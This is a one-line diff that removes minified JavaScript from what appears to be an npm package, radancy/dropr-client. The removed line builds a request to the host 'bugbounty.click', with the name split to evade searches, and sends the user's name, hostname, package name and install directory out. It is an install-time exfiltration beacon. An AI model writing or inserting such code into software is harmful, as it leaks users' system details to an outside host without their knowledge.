@@ -1,1 +1,0 @@
-const t={hostname:"bugbo"+"unty.click",port:443,path:"/dc1234-bug"+"bounty/knock-knock/log-install.php?Username="+encodeURI(o+" ("+e+")")+"&Hostname="+encodeURI(r)+"&Package=radancy%2Fdropr-client&PWD="+__dirname,method:"GET"}
